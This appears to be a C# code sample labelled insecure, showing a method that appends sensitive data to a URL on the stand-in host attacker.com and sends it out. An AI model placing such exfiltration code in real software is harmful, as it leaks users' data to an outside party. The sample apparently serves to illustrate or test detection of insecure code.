public void SendSensitiveDataToUntrustedUrl(string sensitiveData)
{
    // Insecure: Sends sensitive data to an untrusted URL
    var request = WebRequest.Create("http://attacker.com/steal?data=" + sensitiveData);
    using (var response = request.GetResponse())
    {
        Console.WriteLine("Data sent to attacker: " + sensitiveData);
    }
}
